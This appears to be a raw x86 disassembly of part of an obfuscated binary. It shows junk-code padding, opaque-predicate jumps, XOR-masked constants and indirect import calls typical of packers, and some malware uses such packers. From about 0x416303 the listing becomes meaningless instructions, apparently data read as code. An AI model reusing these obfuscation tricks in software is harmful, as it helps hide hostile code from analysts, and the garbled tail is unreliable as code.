  415a61:	push   0x4a1d
  415a66:	push   0x1f83
  415a6b:	push   DWORD PTR [ebp-0x14]
  415a6e:	call   DWORD PTR ds:0x428ec4
  415a74:	mov    edi,DWORD PTR ds:0x42819f
  415a7a:	xor    ecx,ecx
  415a7c:	or     ecx,DWORD PTR ds:0x4281bf
  415a82:	sub    edi,ecx
  415a84:	imul   edi,DWORD PTR [edi+ecx*1]
  415a88:	movzx  edx,WORD PTR ds:0x428157
  415a8f:	and    DWORD PTR ds:0x428383,edx
  415a95:	xor    DWORD PTR ds:0x428223,0x17b
  415a9f:	sbb    DWORD PTR ds:0x4282d7,ecx
  415aa5:	adc    DWORD PTR ds:0x42814b,edi
  415aab:	mov    ecx,DWORD PTR [ebp+0xc]
  415aae:	shrd   eax,ecx,0x2
  415ab2:	shr    ecx,0x2
  415ab5:	mov    ecx,DWORD PTR [ebp+0x8]
  415ab8:	and    edi,0x5809
  415abe:	mov    edx,DWORD PTR [ebp+0xc]
  415ac1:	mov    edi,DWORD PTR ds:0x428153
  415ac7:	xor    DWORD PTR ds:0x42827f,edi
  415acd:	xor    edx,edx
  415acf:	xor    ebx,ebx
  415ad1:	xor    ebx,DWORD PTR ds:0x4281cf
  415ad7:	xor    edi,edi
  415ad9:	or     edi,DWORD PTR ds:0x42828b
  415adf:	sub    ebx,edi
  415ae1:	or     ebx,DWORD PTR [ebx+edi*1]
  415ae4:	mov    esi,0x329e695d
  415ae9:	xor    eax,esi
  415aeb:	adc    ebx,0x4305
  415af1:	or     eax,edx
  415af3:	mov    DWORD PTR [ebp-0x28],eax
  415af6:	not    edx
  415af8:	mov    eax,DWORD PTR [ebp+0x8]
  415afb:	sbb    DWORD PTR ds:0x428363,edx
  415b01:	shl    ecx,0x1e
  415b04:	mov    ecx,DWORD PTR [ebp+0xc]
  415b07:	shrd   eax,ecx,0x2
  415b0b:	adc    ebx,0x5b1c
  415b11:	xor    eax,esi
  415b13:	shr    ecx,0x2
  415b16:	sbb    DWORD PTR ds:0x42822f,ecx
  415b1c:	mov    ecx,DWORD PTR [ebp+0x8]
  415b1f:	mov    edi,DWORD PTR ds:0x4281af
  415b25:	mov    edx,DWORD PTR ds:0x4281ff
  415b2b:	sub    edx,edi
  415b2d:	and    edi,DWORD PTR [edi+edx*1]
  415b30:	mov    edx,DWORD PTR [ebp+0xc]
  415b33:	cmp    DWORD PTR ds:0x42836f,0x0
  415b3a:	not    DWORD PTR ds:0x4282f3
  415b40:	mov    DWORD PTR ds:0x42824b,0x4d0
  415b4a:	mov    DWORD PTR ds:0x428143,0x25d8
  415b54:	jmp    0x415ba8
  415b59:	mov    DWORD PTR ds:0x428353,0x25ca
  415b63:	cmp    DWORD PTR ds:0x42836f,0x0
  415b6a:	jge    0x415b90
  415b70:	push   DWORD PTR [ebp-0x28]
  415b73:	push   0x42813b
  415b78:	push   0x12d6
  415b7d:	call   DWORD PTR ds:0x428e5c
  415b83:	add    DWORD PTR ds:0x42834b,0x4989
  415b8d:	inc    edi
  415b8e:	add    edi,ebx
  415b90:	sbb    DWORD PTR ds:0x4282ff,0x655f
  415b9a:	mov    ebx,DWORD PTR ds:0x4282cb
  415ba0:	adc    DWORD PTR ds:0x428307,ebx
  415ba6:	xor    edi,edi
  415ba8:	xor    edx,edx
  415baa:	add    ebx,edi
  415bac:	or     eax,edx
  415bae:	cmp    DWORD PTR ds:0x42815f,0x0
  415bb5:	mov    DWORD PTR ds:0x428157,0x74bf
  415bbf:	mov    DWORD PTR ds:0x4282d7,0x4195
  415bc9:	jmp    0x415c2e
  415bce:	mov    ebx,0x25c0
  415bd3:	mov    ebx,0x1763
  415bd8:	cmp    DWORD PTR ds:0x42815f,0x0
  415bdf:	jl     0x415c13
  415be5:	push   0x432b
  415bea:	push   0x428237
  415bef:	call   DWORD PTR ds:0x428e60
  415bf5:	sub    edi,DWORD PTR ds:0x428383
  415bfb:	sbb    DWORD PTR ds:0x428307,ecx
  415c01:	and    edx,DWORD PTR ds:0x428177
  415c07:	mov    edi,DWORD PTR ds:0x42821f
  415c0d:	and    DWORD PTR ds:0x42815b,edi
  415c13:	or     DWORD PTR ds:0x428153,0x73d6
  415c1d:	mov    edi,DWORD PTR ds:0x428183
  415c23:	mov    edx,DWORD PTR ds:0x42830b
  415c29:	sub    edi,edx
  415c2b:	xor    edi,DWORD PTR [edi+edx*1]
  415c2e:	mov    DWORD PTR [ebp-0x28],eax
  415c31:	cmp    DWORD PTR ds:0x42834f,0x0
  415c38:	mov    DWORD PTR ds:0x42837b,ebx
  415c3e:	mov    DWORD PTR ds:0x42814f,ecx
  415c44:	jmp    0x415cab
  415c49:	mov    DWORD PTR ds:0x42816b,edx
  415c4f:	cmp    DWORD PTR ds:0x42834f,0x0
  415c56:	jbe    0x415ca1
  415c5c:	push   0x6725
  415c61:	push   0x4282eb
  415c66:	push   0x8698
  415c6b:	push   0x6e02
  415c70:	push   0x538f
  415c75:	push   DWORD PTR [ebp-0x24]
  415c78:	push   0x8d72
  415c7d:	push   0x8325
  415c82:	call   DWORD PTR ds:0x428db0
  415c88:	mov    edi,DWORD PTR ds:0x4281a7
  415c8e:	mov    edx,DWORD PTR ds:0x42832f
  415c94:	sub    edi,edx
  415c96:	sub    edi,DWORD PTR [edi+edx*1]
  415c99:	add    DWORD PTR ds:0x428307,ebx
  415c9f:	or     edx,ebx
  415ca1:	add    edx,edi
  415ca3:	or     ebx,ebx
  415ca5:	and    ebx,DWORD PTR ds:0x42821f
  415cab:	mov    eax,ds:0x4223b8
  415cb0:	xor    edx,0x5bba
  415cb6:	mov    eax,DWORD PTR [eax]
  415cb8:	or     ebx,edx
  415cba:	mov    DWORD PTR [ebp-0xc],eax
  415cbd:	and    edi,0x77ac
  415cc3:	mov    eax,ds:0x4225d8
  415cc8:	mov    eax,DWORD PTR [eax]
  415cca:	cmp    DWORD PTR ds:0x42836b,0x0
  415cd1:	mov    edi,DWORD PTR ds:0x42825b
  415cd7:	mov    ebx,DWORD PTR ds:0x428383
  415cdd:	mov    DWORD PTR ds:0x428223,0x6f52
  415ce7:	jmp    0x415d31
  415cec:	mov    DWORD PTR ds:0x42835b,0x23d0
  415cf6:	cmp    DWORD PTR ds:0x42836b,0x0
  415cfd:	ja     0x415d21
  415d03:	push   DWORD PTR [ebp-0x18]
  415d06:	push   0x1c98
  415d0b:	push   DWORD PTR [ebp-0x1c]
  415d0e:	push   DWORD PTR [ebp-0xc]
  415d11:	call   DWORD PTR ds:0x428db4
  415d17:	or     ebx,edx
  415d19:	or     edx,edi
  415d1b:	adc    edi,0x39b9
  415d21:	and    edx,DWORD PTR ds:0x428247
  415d27:	sbb    edx,edi
  415d29:	add    edx,edi
  415d2b:	sbb    ebx,0x45bb
  415d31:	mov    DWORD PTR [ebp-0x10],eax
  415d34:	xor    DWORD PTR ds:0x42825f,0x428243
  415d3e:	mov    eax,DWORD PTR [ebp-0xc]
  415d41:	sbb    DWORD PTR ds:0x4282ef,0x4085
  415d4b:	mov    eax,DWORD PTR [ebp-0xc]
  415d4e:	mov    ebx,DWORD PTR [ebp+0x8]
  415d51:	cmp    DWORD PTR ds:0x428307,0x0
  415d58:	mov    DWORD PTR ds:0x428263,0x5216
  415d62:	not    DWORD PTR ds:0x42823b
  415d68:	mov    edi,0x3d1c
  415d6d:	mov    DWORD PTR ds:0x42825b,0x4705
  415d77:	jmp    0x415dc1
  415d7c:	mov    DWORD PTR ds:0x42827b,ebx
  415d82:	cmp    DWORD PTR ds:0x428307,0x0
  415d89:	jg     0x415da3
  415d8f:	push   0x42809b
  415d94:	push   0x428049
  415d99:	call   DWORD PTR ds:0x428db8
  415d9f:	and    edx,edx
  415da1:	sub    edi,edi
  415da3:	xor    edx,edx
  415da5:	xor    edx,DWORD PTR ds:0x42825f
  415dab:	sbb    DWORD PTR ds:0x428383,edx
  415db1:	or     DWORD PTR ds:0x428363,ebx
  415db7:	sbb    DWORD PTR ds:0x428283,0x12ba
  415dc1:	shl    ecx,0x1e
  415dc4:	xor    ecx,ecx
  415dc6:	adc    DWORD PTR ds:0x4282ff,ecx
  415dcc:	shld   ecx,eax,0x2
  415dd0:	shl    eax,0x2
  415dd3:	mov    edi,0xca79a575
  415dd8:	mov    edx,0x9c1b89e8
  415ddd:	or     DWORD PTR ds:0x42813f,0x4c83
  415de7:	mov    DWORD PTR [ebp-0x38],ebx
  415dea:	mov    ebx,DWORD PTR [ebp+0xc]
  415ded:	xor    DWORD PTR ds:0x428137,0x6279
  415df7:	xor    eax,edi
  415df9:	sub    DWORD PTR ds:0x42817b,0x428143
  415e03:	xor    ecx,edx
  415e05:	mov    DWORD PTR ds:0x42817b,0x1398
  415e0f:	mov    DWORD PTR [ebp-0x1c],0xa4069bae
  415e16:	mov    DWORD PTR ds:0x42834f,0x5e42
  415e20:	mov    DWORD PTR [ebp-0x18],0xa40692ae
  415e27:	mov    DWORD PTR [ebp-0x34],ebx
  415e2a:	mov    DWORD PTR ds:0x428257,0x218e
  415e34:	cmp    eax,DWORD PTR [ebp-0x38]
  415e37:	mov    DWORD PTR ds:0x428283,0x534
  415e41:	jne    0x415e59
  415e47:	mov    DWORD PTR ds:0x42822f,0x12af
  415e51:	cmp    ecx,ebx
  415e53:	je     0x416649
  415e59:	mov    eax,DWORD PTR [ebp-0x10]
  415e5c:	adc    DWORD PTR ds:0x42825f,edx
  415e62:	mov    eax,DWORD PTR [ebp-0x10]
  415e65:	xor    ecx,ecx
  415e67:	shld   ecx,eax,0x2
  415e6b:	and    DWORD PTR ds:0x4282e7,0x42816f
  415e75:	shl    eax,0x2
  415e78:	xor    ecx,edx
  415e7a:	cmp    DWORD PTR ds:0x428153,0x0
  415e81:	not    edx
  415e83:	mov    DWORD PTR ds:0x4282ff,edx
  415e89:	mov    edx,0x6413
  415e8e:	jmp    0x415f0c
  415e93:	mov    DWORD PTR ds:0x42816f,0x1988
  415e9d:	mov    DWORD PTR ds:0x428277,0x1d2b
  415ea7:	cmp    DWORD PTR ds:0x428153,0x0
  415eae:	je     0x415ee8
  415eb4:	push   0x6b61
  415eb9:	push   0x4c93
  415ebe:	call   DWORD PTR ds:0x428dbc
  415ec4:	or     DWORD PTR ds:0x428213,0x4f44
  415ece:	or     edx,0x2695
  415ed4:	sub    DWORD PTR ds:0x42834b,0x174
  415ede:	mov    DWORD PTR ds:0x42836f,0x41a3
  415ee8:	mov    edx,DWORD PTR ds:0x42836b
  415eee:	add    edx,DWORD PTR ds:0x42814f
  415ef4:	mov    DWORD PTR ds:0x42836b,edx
  415efa:	or     DWORD PTR ds:0x428357,ecx
  415f00:	mov    edx,DWORD PTR ds:0x428307
  415f06:	or     DWORD PTR ds:0x428267,edx
  415f0c:	mov    edx,DWORD PTR [ebp+0x8]
  415f0f:	xor    eax,edi
  415f11:	mov    DWORD PTR ds:0x428277,ecx
  415f17:	mov    edi,DWORD PTR [ebp+0xc]
  415f1a:	cmp    eax,edx
  415f1c:	jne    0x415f34
  415f22:	cmp    ecx,edi
  415f24:	mov    DWORD PTR ds:0x4282ff,0x9a6
  415f2e:	je     0x416649
  415f34:	cmp    DWORD PTR ds:0x428133,0x0
  415f3b:	mov    DWORD PTR ds:0x428157,0x3be3
  415f45:	movzx  ebx,WORD PTR ds:0x428357
  415f4c:	not    edi
  415f4e:	jmp    0x415fba
  415f53:	mov    DWORD PTR ds:0x4282f7,ebx
  415f59:	cmp    DWORD PTR ds:0x428133,0x0
  415f60:	jne    0x415fad
  415f66:	push   0x3f61
  415f6b:	push   0x3f0f
  415f70:	push   DWORD PTR [ebp-0x18]
  415f73:	push   0x84fe
  415f78:	push   DWORD PTR [ebp-0x18]
  415f7b:	push   DWORD PTR [ebp-0x10]
  415f7e:	push   0x689e
  415f83:	push   DWORD PTR [ebp-0x18]
  415f86:	push   0x8af6
  415f8b:	call   DWORD PTR ds:0x428ec8
  415f91:	xor    DWORD PTR ds:0x428387,edx
  415f97:	sbb    edi,DWORD PTR ds:0x428263
  415f9d:	sub    DWORD PTR ds:0x42821f,0x4f5e
  415fa7:	sub    ecx,DWORD PTR ds:0x42835b
  415fad:	add    edi,0xe71
  415fb3:	dec    ecx
  415fb4:	and    ecx,DWORD PTR ds:0x428303
  415fba:	mov    eax,DWORD PTR [ebp-0x18]
  415fbd:	and    DWORD PTR ds:0x428353,ebx
  415fc3:	mov    ecx,DWORD PTR [ebp-0x18]
  415fc6:	push   0xfffffffe
  415fc8:	pop    ebx
  415fc9:	and    DWORD PTR ds:0x42816b,0xd25
  415fd3:	xor    ecx,ebx
  415fd5:	movzx  edi,BYTE PTR ds:0x42816b
  415fdc:	add    DWORD PTR ds:0x428253,edi
  415fe2:	shl    ecx,0x1e
  415fe5:	cmp    DWORD PTR ds:0x42821f,0x0
  415fec:	mov    DWORD PTR ds:0x428373,ecx
  415ff2:	mov    edi,0x37d1
  415ff7:	mov    DWORD PTR ds:0x428387,0x730b
  416001:	mov    edi,0x60e5
  416006:	jmp    0x416062
  41600b:	mov    DWORD PTR ds:0x428353,0x1cd3
  416015:	mov    DWORD PTR ds:0x42814f,0x4bc0
  41601f:	cmp    DWORD PTR ds:0x42821f,0x0
  416026:	jg     0x41603f
  41602c:	push   0x1ec5
  416031:	call   DWORD PTR ds:0x428ecc
  416037:	add    DWORD PTR ds:0x428153,edx
  41603d:	neg    edi
  41603f:	mov    DWORD PTR ds:0x4282f7,0x2c32
  416049:	and    edi,DWORD PTR ds:0x42822f
  41604f:	and    edi,0x1973
  416055:	movzx  edi,WORD PTR ds:0x428227
  41605c:	adc    DWORD PTR ds:0x42824b,edi
  416062:	mov    edi,0xa4069aaf
  416067:	and    DWORD PTR ds:0x42837b,0x1058
  416071:	xor    eax,edi
  416073:	sub    DWORD PTR ds:0x4282e7,0x42825f
  41607d:	shr    eax,0x2
  416080:	or     eax,ecx
  416082:	cmp    DWORD PTR ds:0x42816f,0x0
  416089:	mov    DWORD PTR ds:0x428307,0x1e83
  416093:	mov    DWORD PTR ds:0x428363,edx
  416099:	movzx  ecx,WORD PTR ds:0x42823b
  4160a0:	jmp    0x4160ed
  4160a5:	not    ecx
  4160a7:	mov    ecx,DWORD PTR ds:0x428173
  4160ad:	cmp    DWORD PTR ds:0x42816f,0x0
  4160b4:	jg     0x4160e2
  4160ba:	push   DWORD PTR [ebp-0x20]
  4160bd:	push   DWORD PTR [ebp-0x18]
  4160c0:	call   DWORD PTR ds:0x428dc0
  4160c6:	adc    DWORD PTR ds:0x4282fb,edi
  4160cc:	or     DWORD PTR ds:0x42823b,0x4a59
  4160d6:	mov    ecx,DWORD PTR ds:0x42820f
  4160dc:	sub    DWORD PTR ds:0x42816b,ecx
  4160e2:	add    DWORD PTR ds:0x42825f,0x16e5
  4160ec:	dec    ecx
  4160ed:	mov    DWORD PTR [ebp-0x34],eax
  4160f0:	mov    eax,ds:0x422538
  4160f5:	and    ecx,DWORD PTR ds:0x42824f
  4160fb:	mov    DWORD PTR [ebp-0x34],eax
  4160fe:	mov    eax,DWORD PTR [ebp-0xc]
  416101:	mov    DWORD PTR [ebp-0x14],eax
  416104:	xor    DWORD PTR ds:0x42835b,ecx
  41610a:	mov    ecx,DWORD PTR [ebp-0x14]
  41610d:	or     DWORD PTR ds:0x428373,0x5817
  416117:	push   0x4
  416119:	cmp    DWORD PTR ds:0x42816b,0x0
  416120:	mov    DWORD PTR ds:0x428353,0x7b16
  41612a:	mov    DWORD PTR ds:0x42816f,0x195b
  416134:	jmp    0x41618b
  416139:	mov    DWORD PTR ds:0x42824b,0x5f2a
  416143:	cmp    DWORD PTR ds:0x42816b,0x0
  41614a:	jle    0x41616d
  416150:	push   DWORD PTR [ebp-0x20]
  416153:	call   DWORD PTR ds:0x428ed0
  416159:	xor    DWORD PTR ds:0x428147,0x42813b
  416163:	sub    DWORD PTR ds:0x428133,0x42815f
  41616d:	sbb    DWORD PTR ds:0x42826f,0x428267
  416177:	and    DWORD PTR ds:0x42825f,0x56d1
  416181:	xor    DWORD PTR ds:0x42824b,0x1431
  41618b:	pop    eax
  41618c:	or     DWORD PTR ds:0x42823f,0x42817b
  416196:	sub    eax,ecx
  416198:	mov    ecx,DWORD PTR [ebp-0x10]
  41619b:	add    ecx,eax
  41619d:	mov    DWORD PTR [ebp-0x24],ecx
  4161a0:	mov    ecx,DWORD PTR ds:0x4281ef
  4161a6:	mov    ecx,DWORD PTR [ecx]
  4161a8:	sbb    DWORD PTR ds:0x428173,ecx
  4161ae:	lea    eax,[ebp-0x30]
  4161b1:	mov    DWORD PTR [ebp-0x2c],eax
  4161b4:	and    eax,0x1e1b
  4161b9:	mov    eax,DWORD PTR [ebp-0x1c]
  4161bc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4161bf:	xor    eax,edi
  4161c1:	xor    ecx,ebx
  4161c3:	sub    DWORD PTR ds:0x42816b,0x428247
  4161cd:	shr    eax,0x2
  4161d0:	and    DWORD PTR ds:0x42826b,0x42822b
  4161da:	shl    ecx,0x1e
  4161dd:	sbb    DWORD PTR ds:0x4282f7,0x42820b
  4161e7:	or     eax,ecx
  4161e9:	or     DWORD PTR ds:0x428263,0x697f
  4161f3:	mov    DWORD PTR [ebp-0x20],eax
  4161f6:	mov    DWORD PTR [ebp-0x8],0xa4069abe
  4161fd:	mov    eax,DWORD PTR [ebp-0x8]
  416200:	mov    ecx,DWORD PTR [ebp-0x8]
  416203:	xor    eax,edi
  416205:	xor    ecx,ebx
  416207:	shr    eax,0x2
  41620a:	shl    ecx,0x1e
  41620d:	or     ecx,eax
  41620f:	push   ecx
  416210:	lea    eax,[ebp-0x8]
  416213:	push   eax
  416214:	lea    eax,[ebp-0x7c]
  416217:	push   eax
  416218:	call   0x415231
  41621d:	mov    eax,DWORD PTR [ebp-0x8]
  416220:	mov    ecx,DWORD PTR [ebp-0x8]
  416223:	xor    eax,edi
  416225:	xor    ecx,ebx
  416227:	shr    eax,0x2
  41622a:	shl    ecx,0x1e
  41622d:	or     ecx,eax
  41622f:	push   ecx
  416230:	lea    eax,[ebp-0x14]
  416233:	push   eax
  416234:	mov    eax,DWORD PTR [ebp+0x8]
  416237:	mov    ecx,DWORD PTR [ebp+0xc]
  41623a:	shrd   eax,ecx,0x2
  41623e:	shr    ecx,0x2
  416241:	mov    ecx,DWORD PTR [ebp+0x8]
  416244:	mov    edx,DWORD PTR [ebp+0xc]
  416247:	xor    eax,esi
  416249:	xor    edx,edx
  41624b:	or     eax,edx
  41624d:	lea    eax,[ebp+eax*4-0x78]
  416251:	push   eax
  416252:	shl    ecx,0x1e
  416255:	call   0x415231
  41625a:	mov    eax,DWORD PTR [ebp-0x8]
  41625d:	mov    ecx,DWORD PTR [ebp-0x8]
  416260:	xor    eax,edi
  416262:	xor    ecx,ebx
  416264:	shr    eax,0x2
  416267:	shl    ecx,0x1e
  41626a:	or     ecx,eax
  41626c:	push   ecx
  41626d:	lea    eax,[ebp-0x24]
  416270:	push   eax
  416271:	mov    eax,DWORD PTR [ebp+0x10]
  416274:	mov    ecx,DWORD PTR [ebp+0x14]
  416277:	shrd   eax,ecx,0x2
  41627b:	shr    ecx,0x2
  41627e:	mov    ecx,DWORD PTR [ebp+0x10]
  416281:	mov    edx,DWORD PTR [ebp+0x14]
  416284:	xor    eax,esi
  416286:	xor    edx,edx
  416288:	or     eax,edx
  41628a:	lea    eax,[ebp+eax*4-0x78]
  41628e:	push   eax
  41628f:	shl    ecx,0x1e
  416292:	call   0x415231
  416297:	mov    eax,DWORD PTR [ebp-0x8]
  41629a:	mov    ecx,DWORD PTR [ebp-0x8]
  41629d:	xor    ecx,ebx
  41629f:	xor    eax,edi
  4162a1:	shl    ecx,0x1e
  4162a4:	shr    eax,0x2
  4162a7:	or     ecx,eax
  4162a9:	push   ecx
  4162aa:	lea    eax,[ebp-0x20]
  4162ad:	push   eax
  4162ae:	mov    eax,DWORD PTR [ebp+0x10]
  4162b1:	mov    ecx,DWORD PTR [ebp+0x14]
  4162b4:	shrd   eax,ecx,0x2
  4162b8:	shr    ecx,0x2
  4162bb:	mov    ecx,DWORD PTR [ebp+0x10]
  4162be:	mov    edx,DWORD PTR [ebp+0x14]
  4162c1:	xor    edx,edx
  4162c3:	xor    eax,esi
  4162c5:	or     eax,edx
  4162c7:	shl    ecx,0x1e
  4162ca:	mov    ecx,DWORD PTR [ebp+0x10]
  4162cd:	mov    edx,DWORD PTR [ebp+0x14]
  4162d0:	shrd   ecx,edx,0x2
  4162d4:	shr    edx,0x2
  4162d7:	mov    edx,DWORD PTR [ebp+0x10]
  4162da:	mov    ebx,DWORD PTR [ebp+0x14]
  4162dd:	xor    ecx,esi
  4162df:	xor    ebx,ebx
  4162e1:	or     ecx,ebx
  4162e3:	add    eax,ecx
  4162e5:	lea    eax,[ebp+eax*4-0x78]
  4162e9:	push   eax
  4162ea:	shl    edx,0x1e
  4162ed:	call   0x415231
  4162f2:	mov    eax,DWORD PTR [ebp-0x8]
  4162f5:	mov    ecx,DWORD PTR [ebp-0x8]
  4162f8:	xor    ecx,0xfffffffe
  4162fb:	shl    ecx,0x1e
  4162fe:	jmp    0x41655e
  416303:	sbb    eax,0x26add60b
  416308:	lods   eax,DWORD PTR ds:[esi]
  416309:	sbb    bh,BYTE PTR [edx-0x45]
  41630c:	xor    bl,BYTE PTR [ebx+0x70]
  41630f:	(bad)  
  416310:	pop    edi
  416311:	pop    ds
  416312:	jle    0x416308
  416314:	add    BYTE PTR [esi],dl
  416316:	sbb    BYTE PTR [ebx-0x59e7e7ec],bl
  41631c:	inc    edx
  41631d:	xor    dh,bh
  41631f:	loope  0x4162ca
  416321:	sub    BYTE PTR [edx-0x7],dl
  416324:	xor    BYTE PTR [edi-0x1b15d99e],ch
  41632a:	mov    ch,0x2c
  41632c:	xchg   DWORD PTR [eax-0x5d],esp
  41632f:	test   ah,ah
  416331:	call   0xd299:0xb5f6544c
  416338:	sub    DWORD PTR [ebp-0x3e176ffe],ecx
  41633e:	mov    edi,0x800b2909
  416343:	dec    esi
  416344:	or     al,0x3d
  416346:	adc    ebx,eax
  416348:	loop   0x4162ef
  41634a:	push   esi
  41634b:	cmp    edx,edx
  41634d:	mov    al,ds:0xc0c1b710
  416352:	dec    esi
  416353:	push   ds
  416354:	test   al,0x0
  416356:	lock xchg BYTE PTR [edi],dl
  416359:	jne    0x4162e9
  41635b:	adc    BYTE PTR [ebp+0x79e3e2b],bl
  416361:	mov    WORD PTR [esi-0x4d],ss
  416364:	sub    DWORD PTR [eax+0x3a6beb28],ebp
  41636a:	jae    0x416348
  41636c:	aaa    
  41636d:	dec    esi
  41636e:	fcmovnb st,st(2)
  416370:	je     0x416361
  416372:	or     BYTE PTR [ecx],0xb2
  416375:	pop    esi
  416376:	imul   esp,DWORD PTR [ebp+0x4d9f48c1],0x15
  41637d:	push   ecx
  41637e:	xchg   ebp,eax
  41637f:	call   0xc597:0x29b55e24
  416386:	xor    al,0xf9
  416388:	pop    ss
  416389:	(bad)  
  41638a:	ret    
  41638b:	jo     0x416399
  41638d:	jmp    0x4163a6
  41638f:	pop    ebp
  416390:	sub    BYTE PTR [esp+ebx*1-0xb16711e],0x66
  416398:	mov    esi,0x53e8fab6
  41639d:	sbb    ebp,edi
  41639f:	ins    DWORD PTR es:[edi],dx
  4163a0:	(bad)  
  4163a1:	inc    esi
  4163a2:	push   esp
  4163a3:	adc    al,0x6b
  4163a5:	aam    0xb0
  4163a7:	or     BYTE PTR [edi],cl
  4163a9:	and    edx,edx
  4163ab:	pop    es
  4163ac:	ins    BYTE PTR es:[edi],dx
  4163ad:	dec    esi
  4163ae:	add    DWORD PTR [esi],edx
  4163b0:	fwait
  4163b1:	dec    ebx
  4163b2:	sub    BYTE PTR [edi+0x631916cb],cl
  4163b8:	xor    cl,bl
  4163ba:	add    al,BYTE PTR [ebx]
  4163bc:	rcl    BYTE PTR [eax],1
  4163be:	pop    ds
  4163bf:	mov    bh,0x48
  4163c1:	sti    
  4163c2:	scas   al,BYTE PTR es:[edi]
  4163c3:	inc    esp
  4163c4:	add    BYTE PTR [ebp+0x6],ah
  4163c7:	jbe    0x416405
  4163c9:	das    
  4163ca:	jmp    0x4163b6
  4163cc:	sbb    dh,BYTE PTR [ebx]
  4163ce:	or     eax,0xc89edb5c
  4163d3:	xor    eax,0x65a986b3
  4163d8:	dec    ebp
  4163d9:	dec    ebx
  4163da:	fwait
  4163db:	xchg   BYTE PTR [esi],dl
  4163dd:	pop    eax
  4163de:	xchg   esp,eax
  4163df:	and    BYTE PTR [edx+0xd],bh
  4163e2:	sub    esi,DWORD PTR [ebx]
  4163e4:	push   ss
  4163e5:	sub    esi,edi
  4163e7:	mov    ecx,0xfa1ca4bb
  4163ec:	xor    cl,cl
  4163ee:	cli    
  4163ef:	(bad)  
  4163f0:	adc    al,0x5b
  4163f2:	es call 0xfef3c881
  4163f8:	pusha  
  4163f9:	fwait
  4163fa:	call   0xdf580a8b
  4163ff:	cmp    eax,0x3e1b122b
  416404:	dec    esp
  416405:	add    DWORD PTR [edi+ecx*4-0x29],edi
  416409:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41640a:	icebp  
  41640b:	(bad)  
  41640c:	push   cs
  41640d:	mov    ?,WORD PTR [ebp+0x13]
  416410:	fs scas al,BYTE PTR es:[edi]
  416412:	jns    0x416493
  416414:	out    0xb5,al
  416416:	jb     0x416456
  416418:	mov    cl,0x3e
  41641a:	inc    esi
  41641b:	mov    dl,0xd0
  41641d:	xchg   BYTE PTR [edi-0x41a565dd],ah
  416423:	xor    eax,0xc7a40aee
  416428:	into   
  416429:	ror    BYTE PTR [esi-0x51bf8d4a],0x3d
  416430:	dec    eax
  416431:	lock inc ecx
  416433:	mov    esi,DWORD PTR [eax]
  416435:	fwait
  416436:	or     al,0x20
  416438:	(bad)  
  416439:	call   0x45118594
  41643e:	sbb    al,0xf8
  416440:	enter  0x9021,0xa9
  416444:	pop    ss
  416445:	add    ecx,edi
  416447:	std    
  416448:	int3   
  416449:	int3   
  41644a:	ret    
  41644b:	pop    ebx
  41644c:	add    bl,dl
  41644e:	out    0xaf,eax
  416450:	jae    0x4163ed
  416452:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416453:	fwait
  416454:	xchg   esp,eax
  416455:	cmc    
  416456:	in     eax,dx
  416457:	(bad)  
  416458:	jmp    0xb3e9:0x7fcc5a16
  41645f:	sbb    DWORD PTR [ecx],ecx
  416461:	sub    bh,BYTE PTR [ecx+0x7a]
  416464:	in     al,0xc
  416466:	in     al,0x8c
  416468:	jecxz  0x416463
  41646a:	lods   eax,DWORD PTR ds:[esi]
  41646b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41646c:	jnp    0x4164d2
  41646e:	cmp    eax,DWORD PTR [edi+0x64924886]
  416474:	xor    esi,DWORD PTR [edx-0x34e0216]
  41647a:	sbb    DWORD PTR [esi-0x6e],esi
  41647d:	sar    BYTE PTR [ebx],0xd2
  416480:	xchg   esi,eax
  416481:	mov    ah,0x9b
  416483:	lock stc 
  416485:	std    
  416486:	fidiv  WORD PTR [edx+edx*1+0x4b799d09]
  41648d:	push   cs
  41648e:	cmp    ebx,DWORD PTR [eax+0x3c]
  416491:	sbb    BYTE PTR [ecx-0x69],0x78
  416495:	imul   ecx,DWORD PTR [eax-0x15ae5c],0x42
  41649c:	mov    ds:0xd9470a7a,eax
  4164a1:	(bad)  
  4164a2:	aas    
  4164a3:	jno    0x41643e
  4164a5:	adc    DWORD PTR [ebx+0x61e478c],esp
  4164ab:	and    bl,BYTE PTR [ebx]
  4164ad:	sub    DWORD PTR [ebp+0x47],esi
  4164b0:	xor    DWORD PTR [edx],esi
  4164b2:	loop   0x41649c
  4164b4:	dec    ebx
  4164b5:	add    eax,0xd48f6019
  4164ba:	loopne 0x416443
  4164bc:	cmp    BYTE PTR [edx-0x42],al
  4164bf:	adc    eax,0x89f96d41
  4164c4:	retf   0x439e
  4164c7:	loope  0x41652c
  4164c9:	out    dx,al
  4164ca:	cmp    dh,BYTE PTR [esi+0x1f]
  4164cd:	sbb    al,0x77
  4164cf:	inc    eax
  4164d0:	mov    edi,0xe50542b5
  4164d5:	push   ebp
  4164d6:	or     al,0xf
  4164d8:	add    bl,BYTE PTR [edi]
  4164da:	inc    ebp
  4164db:	push   ebx
  4164dc:	mov    eax,ds:0x9ccc6a00
  4164e1:	ficom  DWORD PTR [esi]
  4164e3:	push   es
  4164e4:	mov    ds:0x67b73bdc,eax
  4164e9:	retf   0x189e
  4164ec:	mov    ebp,0xa7546b26
  4164f1:	and    al,0x32
  4164f3:	inc    esi
  4164f5:	pop    ecx
  4164f6:	ret    
  4164f7:	test   eax,0x7a1f5524
  4164fc:	enter  0x8b00,0x37
  416500:	xchg   ebx,eax
  416501:	push   ebx
  416502:	cmc    
  416503:	adc    al,0xe2
  416505:	mov    bh,0xaa
  416507:	(bad)  
  416508:	out    0x30,al
  41650a:	das    
  41650b:	sbb    eax,0xc8b13d95
  416510:	push   esp
  416511:	rcr    BYTE PTR [ebp+0x291f5],cl
  416517:	pop    ss
  416518:	push   0xffffffbb
  41651a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41651b:	sbb    eax,0x45b1269
  416520:	sbb    edi,DWORD PTR [ebx+esi*2-0x360d0ac4]
  416527:	jne    0x4164fd
  416529:	pop    esp
  41652a:	shl    DWORD PTR [ecx+ebp*8-0x60],1
  41652e:	cdq    
  41652f:	hlt    
  416530:	push   0xffffffa6
  416532:	stc    
  416533:	daa    
  416534:	jmp    0x9cf4:0xb7b228ea
  41653b:	fs cmp eax,0xa646fd25
  416541:	dec    edi
  416542:	xchg   esp,eax
  416543:	pop    esp
  416544:	fwait
  416545:	sbb    al,0x14
